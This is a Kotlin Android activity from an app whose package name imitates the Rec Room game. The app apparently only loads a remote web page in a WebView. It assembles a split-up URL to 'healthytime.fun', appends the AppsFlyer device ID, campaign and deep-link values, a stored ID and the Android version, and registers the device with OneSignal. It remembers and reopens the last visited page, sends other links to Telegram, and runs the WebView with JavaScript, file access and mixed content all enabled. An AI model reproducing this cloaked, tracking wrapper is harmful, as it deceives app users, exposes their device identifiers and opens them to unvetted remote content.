package com.AgainstGravity.RecRoo.bp

import android.Manifest
import android.app.Activity
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Log
import android.webkit.*
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.AgainstGravity.RecRoo.R
import com.AgainstGravity.RecRoo.bp.Constant.C11
import com.AgainstGravity.RecRoo.bp.Constant.C22
import com.AgainstGravity.RecRoo.bp.Constant.C33
import com.AgainstGravity.RecRoo.bp.Constant.C44
import com.AgainstGravity.RecRoo.bp.Constant.C55
import com.AgainstGravity.RecRoo.bp.Constant.C66
import com.AgainstGravity.RecRoo.bp.Constant.C77
import com.AgainstGravity.RecRoo.bp.Constant.C88
import com.AgainstGravity.RecRoo.bp.Constant.DL1
import com.AgainstGravity.RecRoo.bp.Constant.DL2
import com.AgainstGravity.RecRoo.bp.Constant.DL3
import com.AgainstGravity.RecRoo.bp.Constant.DL4
import com.AgainstGravity.RecRoo.bp.Constant.DL5
import com.AgainstGravity.RecRoo.bp.Constant.DL6
import com.AgainstGravity.RecRoo.bp.Constant.DL7
import com.AgainstGravity.RecRoo.bp.Constant.DL8
import com.AgainstGravity.RecRoo.bp.Constant.FULL_DEEPLINK
import com.AgainstGravity.RecRoo.bp.Constant.FULL_NAMING
import com.appsflyer.AppsFlyerLib
import com.onesignal.OneSignal
import com.orhanobut.hawk.Hawk
import kotlinx.android.synthetic.main.activity_web.*
import org.json.JSONException
import org.json.JSONObject
import java.io.File
import java.io.IOException

class Web : AppCompatActivity() {
    private val TAGW: String = this::class.java.simpleName
    private val FILECHOOSERRESULTCODE = 1

    // the same for Android 5.0 methods only
    var mFilePathCallback: ValueCallback<Array<Uri>>? = null
    var mCameraPhotoPath: String? = null
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_web)

        Toast.makeText(this, "Loading...", Toast.LENGTH_LONG).show()

        val cookieManager = CookieManager.getInstance()
        cookieManager.setAcceptCookie(true)
        cookieManager.setAcceptThirdPartyCookies(elfyView, true)
        webSettings()

        val activity: Activity = this

        elfyView.webViewClient = object : WebViewClient() {


            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                try {


                    if (URLUtil.isNetworkUrl(url)) {
                        return false
                    }
                    if (appInstalledOrNot(url)) {
                        Log.d("devx", "ffff")

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.setData(Uri.parse(url))
                        startActivity(intent)
                    } else {

                        Toast.makeText(
                            applicationContext,
                            "Application is not installed",
                            Toast.LENGTH_LONG
                        ).show()
                        startActivity(
                            Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("https://play.google.com/store/apps/details?id=org.telegram.messenger")
                            )
                        )
                    }
                    return true
                } catch (e: Exception) {
                    return false
                }
                view.loadUrl(url)

            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                //Save the last visited URL
                saveUrl(url)
            }

            override fun onReceivedError(
                view: WebView,
                errorCode: Int,
                description: String,
                failingUrl: String
            ) {
                Toast.makeText(activity, description, Toast.LENGTH_SHORT).show()
            }
        }
        elfyView.loadUrl(getUrl())
        val permission = Manifest.permission.CAMERA
        val grant = ContextCompat.checkSelfPermission(this, permission)
        if (grant != PackageManager.PERMISSION_GRANTED) {
            val permissionlist = arrayOfNulls<String>(1)
            permissionlist[0] = permission
            ActivityCompat.requestPermissions(this, permissionlist, 1)
        }

        elfyView.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView, filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: FileChooserParams
            ): Boolean {
                mFilePathCallback?.onReceiveValue(null)
                mFilePathCallback = filePathCallback
                var takePictureIntent: Intent? = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
                if (takePictureIntent!!.resolveActivity(packageManager) != null) {

                    // create the file where the photo should go
                    var photoFile: File? = null
                    try {
                        photoFile = createImageFile()
                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath)
                    } catch (ex: IOException) {
                        // Error occurred while creating the File
                        Log.e(
                            TAGW,
                            "Unable to create Image File",
                            ex
                        )
                    }

                    // continue only if the file was successfully created
                    if (photoFile != null) {
                        mCameraPhotoPath = "file:" + photoFile.absolutePath
                        takePictureIntent.putExtra(
                            MediaStore.EXTRA_OUTPUT,
                            Uri.fromFile(photoFile)
                        )
                    } else {
                        takePictureIntent = null
                    }
                }
                val contentSelectionIntent = Intent(Intent.ACTION_GET_CONTENT)
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE)
                contentSelectionIntent.type = "image/*"
                val intentArray: Array<Intent?> =
                    takePictureIntent?.let { arrayOf(it) } ?: arrayOfNulls(0)
                val chooserIntent = Intent(Intent.ACTION_CHOOSER)
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent)
                chooserIntent.putExtra(Intent.EXTRA_TITLE, getString(R.string.image_chooser))
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray)
                startActivityForResult(
                    chooserIntent, FILECHOOSERRESULTCODE
                )
                return true
            }

            // creating image files (Lollipop only)
            @Throws(IOException::class)
            private fun createImageFile(): File {
                var imageStorageDir = File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    "DirectoryNameHere"
                )
                if (!imageStorageDir.exists()) {
                    imageStorageDir.mkdirs()
                }

                // create an image file name
                imageStorageDir =
                    File(imageStorageDir.toString() + File.separator + "IMG_" + System.currentTimeMillis() + ".jpg")
                return imageStorageDir
            }

        }


    }
    fun pushToOneSignal(string: String){
// Setting External User Id with Callback Available in SDK Version 4.0.0+
        OneSignal.setExternalUserId(
            string,
            object : OneSignal.OSExternalUserIdUpdateCompletionHandler {
                override fun onSuccess(results: JSONObject) {
                    try {
                        if (results.has("push") && results.getJSONObject("push").has("success")) {
                            val isPushSuccess = results.getJSONObject("push").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for push status: $isPushSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("email") && results.getJSONObject("email").has("success")) {
                            val isEmailSuccess =
                                results.getJSONObject("email").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for email status: $isEmailSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                    try {
                        if (results.has("sms") && results.getJSONObject("sms").has("success")) {
                            val isSmsSuccess = results.getJSONObject("sms").getBoolean("success")
                            OneSignal.onesignalLog(
                                OneSignal.LOG_LEVEL.VERBOSE,
                                "Set external user id for sms status: $isSmsSuccess"
                            )
                        }
                    } catch (e: JSONException) {
                        e.printStackTrace()
                    }
                }

                override fun onFailure(error: OneSignal.ExternalIdError) {
                    // The results will contain channel failure statuses
                    // Use this to detect if external_user_id was not set and retry when a better network connection is made
                    OneSignal.onesignalLog(
                        OneSignal.LOG_LEVEL.VERBOSE,
                        "Set external user id done with error: $error"
                    )
                }
            })
    }
    private fun webSettings() {
        val webSettings = elfyView.settings
        webSettings.javaScriptEnabled = true

        webSettings.useWideViewPort = true

        webSettings.loadWithOverviewMode = true
        webSettings.allowFileAccess = true
        webSettings.domStorageEnabled = true

        webSettings.javaScriptCanOpenWindowsAutomatically = true
        webSettings.setSupportMultipleWindows(false)

        webSettings.displayZoomControls = false
        webSettings.builtInZoomControls = true
        webSettings.setSupportZoom(true)

        webSettings.pluginState = WebSettings.PluginState.ON
        webSettings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        webSettings.setAppCacheEnabled(true)

        webSettings.allowContentAccess = true
    }


    private fun getUrl(): String {
        val spoon = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE)

        val mainid: String = Hawk.get(Constant.MAIN_ID)

        val cpOne: String? = Hawk.get(C11)
        val cpTwo: String? = Hawk.get(C22)
        val cpThree: String? = Hawk.get(C33)
        val cpFour: String? = Hawk.get(C44)
        val cpFive: String? = Hawk.get(C55)
        val cpSix: String? = Hawk.get(C66)
        val cpSeven: String? = Hawk.get(C77)
        val cpEight: String? = Hawk.get(C88)
        val cpAll: String? = Hawk.get(FULL_NAMING)

        val dpOne: String? = Hawk.get(DL1)
        val dpTwo: String? = Hawk.get(DL2)
        val dpThree: String? = Hawk.get(DL3)
        val dpFour: String? = Hawk.get(DL4)
        val dpFive: String? = Hawk.get(DL5)
        val dpSix: String? = Hawk.get(DL6)
        val dpSeven: String? = Hawk.get(DL7)
        val dpEight: String? = Hawk.get(DL8)
        val dpAll: String? = Hawk.get(FULL_DEEPLINK)


        val pack = "com.AgainstGravity.RecRoo"

        val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)

        AppsFlyerLib.getInstance().setCollectAndroidID(true)
        val one = "sub_id_1="
        val two = "sub_id_2="
        val three = "sub_id_3="
        val four = "sub_id_4="
        val five = "sub_id_5="
        val six = "sub_id_6="
        val seven = "sub_id_7="
        val eight = "sub_id_8="
        val nine = "sub_id_9="
        val ten = "sub_id_10="
        val eleven = "sub_id_11="
        val twelve = "sub_id_12="
        val thirteen = "sub_id_13="
        val fourteen = "sub_id_14="


        val first = "https://"
        val second = "healthytime.fun/9ce4W"

        val androidVersion = android.os.Build.VERSION.RELEASE

        val resultAB = first + second
        var after = ""
        if (cpOne.isNullOrEmpty()) { //if organic install or dpl
            after =
                "$resultAB?$one$dpOne&$two$dpTwo&$three$dpThree&$four$dpFour&$five$dpFive&$six$dpSix&$seven$dpSeven&$eight$dpEight&$nine$pack&$ten$afId&$eleven$mainid&$twelve$androidVersion&$thirteen$dpAll&$fourteen" + "deeplinks"
        } else {
            after =
                "$resultAB?$one$cpOne&$two$cpTwo&$three$cpThree&$four$cpFour&$five$cpFive&$six$cpSix&$seven$cpSeven&$eight$cpEight&$nine$pack&$ten$afId&$eleven$mainid&$twelve$androidVersion&$thirteen$cpAll&$fourteen" + "namings"
        }
        Log.d("TESTAG", "Test Result $after")

        pushToOneSignal(afId.toString())

        return spoon.getString("SAVED_URL", after).toString()
    }

    private fun appInstalledOrNot(uri: String): Boolean {

        val pm = packageManager
        try {
            Log.d("devx", uri)

            pm.getPackageInfo("org.telegram.messenger", PackageManager.GET_ACTIVITIES)


            return true
        } catch (e: PackageManager.NameNotFoundException) {

        }
        return false
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode != FILECHOOSERRESULTCODE || mFilePathCallback == null) {
            super.onActivityResult(requestCode, resultCode, data)
            return
        }
        var results: Array<Uri>? = null

        // check that the response is a good one
        if (resultCode == RESULT_OK) {
            if (data == null || data.data == null) {
                // if there is not data, then we may have taken a photo
                results = arrayOf(Uri.parse(mCameraPhotoPath))
            } else {
                val dataString = data.dataString
                if (dataString != null) {
                    results = arrayOf(Uri.parse(dataString))
                }
            }
        }
        mFilePathCallback?.onReceiveValue(results)
        mFilePathCallback = null
    }


    private var doubleBackToExitPressedOnce = false

    override fun onBackPressed() {


        if (elfyView.canGoBack()) {
            if (doubleBackToExitPressedOnce) {
                elfyView.stopLoading()
                elfyView.loadUrl(firstUrl)
                //Toast.makeText(applicationContext, "attemt loading $firstUrl", Toast.LENGTH_LONG).show()
            }
            this.doubleBackToExitPressedOnce = true
            elfyView.goBack()
            Handler(Looper.getMainLooper()).postDelayed({
                doubleBackToExitPressedOnce = false
            }, 2000)

        } else {
            super.onBackPressed()
        }
    }

    var firstUrl = ""
    fun saveUrl(url: String?) {
        if (!url!!.contains("t.me")) {

            if (firstUrl == "") {
                firstUrl = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE).getString(
                    "SAVED_URL",
                    url
                ).toString()

                val sp = getSharedPreferences("SP_WEBVIEW_PREFS", MODE_PRIVATE)
                val editor = sp.edit()
                editor.putString("SAVED_URL", url)
                editor.apply()
            }
        }
    }

}